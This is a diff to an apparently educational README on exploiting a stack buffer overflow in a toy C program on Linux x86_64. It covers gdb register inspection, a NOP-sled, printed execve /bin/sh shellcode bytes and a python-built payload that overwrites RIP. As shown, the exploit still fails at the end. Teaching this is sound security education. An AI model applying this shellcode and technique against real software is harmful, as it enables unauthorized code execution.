@@ -6,10 +6,10 @@ First of all we need some dependencies
 sudo apt-get install gcc gdb
 ```
 
-We asume that we have python2.7 as command python installed beacuse we are going to use "\xHH" for escaping bytes and python3 doesnt handle them very well. Blame utf8 by default in this thing "\xHH" in python3.
-We asume the target system fo the reader is a linux box x86_64, in other sistems should follow throught this readme with some minor modifications by the reader
+We asume that we have _python2.7_ as command python installed beacuse we are going to use _"\xHH"_ for escaping bytes and python3 doesnt handle them very well. Blame _utf8_ by default in this thing _"\xHH"_ in python3.
+We asume the target system fo the reader is a _linux box x86_64_, in other sistems should follow throught this readme with some minor modifications by the reader
 
-Lets begin with a inocent program
+Lets begin with a innocent program
 ```
 #include<stdio.h>
 #include<string.h>
@@ -22,24 +22,24 @@ int main(int argc, char** argv) {
 
 ```
 
-Lets compile it
+Lets compile it:
 ```
 gcc vuln.c -o vuln
 
 ```
 
-Attempting execution with a simple string such as 'hello' returns no errors
+Attempting execution with a simple string such as 'hello' returns no errors:
 ```
 $ ./vuln hello
 ```
 
-Now if we send more than what we defined in our buffer
+Now if we send more than what we defined in our buffer:
 ```
 $ ./vuln $(python -c 'print "\x41" * 524 ')
 Segmentation fault
 ```
 
-This means that we overrun the buffer
+This means that we overrun the buffer.
 
 Lets retry this in the GDB debuger:
 
@@ -50,35 +50,38 @@ Program received signal SIGSEGV, Segmentation fault.
 0x00007f0041414141 in ?? ()
 ```
 
-Now lets check the registers
+Now lets check the registers:
 
 ```
 (gdb) info reg
+rsp            0x7fffffffdfe0	0x7fffffffdfe0
 rip            0x7f0041414141   0x7f0041414141
 ```
-This means that now we control what the rip register point to.
-This is our powerfull weapon beacuse this is the vulnerability itself,
-becuse if we can control rip we can point it to our malicious code.
+This means that now we control what the _RIP_ register or (return instruction pointer) point to.
+This is our powerfull weapon becuse if we can control the _RIP_ register we can point it to our malicious code.
 
-Lets Introduce the nop-sled:
+The register _RSP_ point to the top of the current stack frame.
+We will need to remember this value for later.
 
-The NOOP instruction tells the CPU to do nothing and move to the next instruction.
-The nop sled is like: pincture Boba Fet falling into the Sarlacc pit.
-Anywhere we land into the middle of a nop-sled we end up in the same place.
-And in the end of the nop-sled we are going to put our shellcode.
-Then our main idea is to put a big enought nop-sled that takes almost all the buffer up to almost the address where rip is.
+_Lets Introduce the nop-sled:_
 
-Again we run our inocent program with a bunch of nops
+The _NOP_ instruction tells the CPU to do nothing and move to the next instruction.
+The _NOP-sled_ is like: picture Boba Fet falling into the Sarlacc pit.
+Anywhere we land into the middle of a _NOP-sled_ we end up in the same place.
+And in the end of the _NOP-sled_ we are going to put our shellcode.
+Then our main idea is to put a big enought _NOP-sled_ that takes almost all the buffer up to almost the address where _RIP_ is.
+
+Again we run our innocent program with a bunch of _NOPs_:
 ```
 (gdb) run $(python -c 'print "\x90" * 524 ')
 Program received signal SIGSEGV, Segmentation fault.
 0x00007f0090909090 in ?? ()
 ```
-The same happens but the rip address not points to **0x00007f0090909090**
+The same happens but the rip address now points to **0x00007f0090909090**.
 
-We need to add to the end of the nop-sled our shellcode **"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"**
+We need to add to the end of the _NOP-sled_ our _shellcode:_ **"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"**
 
-This is a generic linux-x86_64 execve /bin/sh shellcode
+This is a generic _linux-x86_64 execve /bin/sh shellcode:_
 
 Its asm code is:
 ```
@@ -122,9 +125,11 @@ Mapped address spaces:
 
 ```
 Our stack is in the region of **0x7ffffffde000-0x7ffffffff000**.
-this means that our nop-sled will need to covert all this region and our rip address will need to point to some place in this region.
-lets say: **0x7fffffffdead**
-We also need to substract the payload from the nop sled, the payload is 23 bytes so 524-23
+this means that our _NÖP-sled_ will need to cover all this region and our _RIP_ address will need to point to some place in this region.
+Lets say: **0x7fffffffdead** this value is arbitrary and has to be in range of the register _RSP_, in our case was **0x7fffffffdfe0**.
+This can vary from system to system distributions and kernels.
+In other cases we need to adjust only the last byte of the address like: _(RSP - **our_choosen_value**) < 518_.
+We also need to substract the payload from the _NOP-sled_, the payload is 23 bytes so 524-23
 
 Lets hit it again:
 ```
@@ -134,10 +139,8 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 We are getting close:
 
-Fur last we need to add our rip address that is going to be overwriten:
-ived signal SIGSEGV, Segmentation fault.
-
-witch is **0x7fffffffdead** and in the x86_64 machine endianess:
+For last we need to add our rip address that is going to be overwriten:
+witch is **0x7fffffffdead** and in the _x86_64_ machine endianess:
 We are going to add it more than one time because we are overwriting registers in ram so we dont know where exactly they are we only kknow that we need to be aligned in order for it to work. And we need to substract it from our nop-sled to not overshoot.
 
 Lets try:
@@ -153,7 +156,7 @@ We got very close:
 **0x7fffffffdead** is our return address in the middle of the nop-sled wen we overflow the RIP register wil point to this address and then the exploit begins.
 
 We need to align our exploit to the machine registers in ram 
-A +2 will suffice
+A +2 will suffice (this also can vary from system to system somethimes can be +3 or +1)
 
 ```
 (gdb) run $(python -c 'print "\x90" * (524-23-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
@@ -169,7 +172,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 But why didnt our exploit worked at all?
 
-Lets inspect our RIP or (return instruction pointer):
+Lets inspect our _RIP_:
 
 ```
 0x00007fffffffdead in ?? ()
